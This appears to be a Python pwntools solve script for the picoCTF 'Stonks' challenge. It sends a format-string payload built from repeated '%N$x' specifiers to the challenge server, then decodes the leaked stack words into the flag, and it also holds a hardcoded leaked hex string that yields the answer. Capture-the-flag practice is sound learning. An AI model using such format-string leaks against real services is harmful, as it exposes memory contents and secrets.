# nc mercury.picoctf.net 53437
from pwn import *

if args.LOCAL:
    p = process("./vuln32")
else:
    p = remote('mercury.picoctf.net', 53437)

p.sendlineafter("View my portfolio\n", b'1')
# p.success("Test")
payload = b''
for i in range(30):
    payload += ('%{}$x-'.format(i+15)).encode()

p.success(payload)
p.sendlineafter("What is your API token?\n", payload)

p.recvuntil("Buying stonks with token:\n")
flagStr = p.recvlineS()[:-2]
p.success(flagStr)
# flagStr = '6f636970-7b465443-306c5f49-345f7435-6d5f6c6c-306d5f79-5f79336e-34636462-61653532-ffe1007d'
flaglist = flagStr.split('-')
# print(flaglist)

flag = ''
for flagtmp in flaglist:
    for i in range(4):
        if not flagtmp[6-2*i:8-2*i]:
            p.success("got flag: {}".format(flag))
            exit(0)
        flag += chr(int(flagtmp[6-2*i:8-2*i], 16))
        # if flagtmp[6-2*i:8-2*i] == '7d':
        #     p.success("got flag: {}".format(flag))
        #     exit(0)

# p.success("got flag: {}".format(flag))

# # print(p.recv())
# p.interactive()

# https://blog.csdn.net/Breeze_CAT/article/details/103789233 pwndbg基本使用

flagStr = '6f636970-7b465443-306c5f49-345f7435-6d5f6c6c-306d5f79-5f79336e-34636462-61653532-ffe1007d'
flaglist = flagStr.split('-')
# print(flaglist)

flag = ''
for flagtmp in flaglist:
    for i in range(4):
        flag += chr(int(flagtmp[6-2*i:8-2*i], 16))

print(flag)